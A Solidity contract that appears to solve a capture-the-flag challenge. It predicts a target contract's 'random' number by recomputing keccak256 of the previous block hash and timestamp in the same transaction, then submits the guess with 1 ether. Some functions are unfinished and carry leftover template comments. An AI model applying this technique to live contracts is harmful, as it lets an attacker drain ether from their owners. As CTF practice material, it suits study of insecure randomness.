pragma solidity ^0.4.21;

interface IGuessTheNewNumberChallenge {
    function guess(uint8 n) public payable;
}

contract CTFGuessTheNewNumber {
    IGuessTheNewNumberChallenge public guessInstance;

    function CTFGuessTheNewNumber() public payable{
        require(msg.value == 1 ether);
    }

    function setGuessMeAddress(address _address) public payable{
        guessInstance = IGuessTheNewNumberChallenge(_address);
    }
    
    function doCaptureByBlockNum(uint nBlockNum) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(nBlockNum), now));
        guessInstance.guess.gas(1000000).value(1 ether)(answer);
    }

    function doCapture() public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        guessInstance.guess.gas(1000000).value(1 ether)(answer);
    }

    function doExample() public payable {
        require(msg.value == 1 ether);
        uint8 answer = 0;
        guessInstance.guess.gas(1000000).value(1 ether)(answer);
    }

    function dontHaveCap() public {
        uint8 answer = 0;
        guessInstance.guess.value(1 ether)(answer);
    }

    function dontHaveCapExample() public payable{
    /// @notice Explain to an end user what this does
    /// @dev Explain to a developer any extra details
    /// @param Documents a parameter just like in doxygen (must be followed by parameter name)() public {
        require(msg.value == 1 ether);
        uint8 answer = 0;
    }
}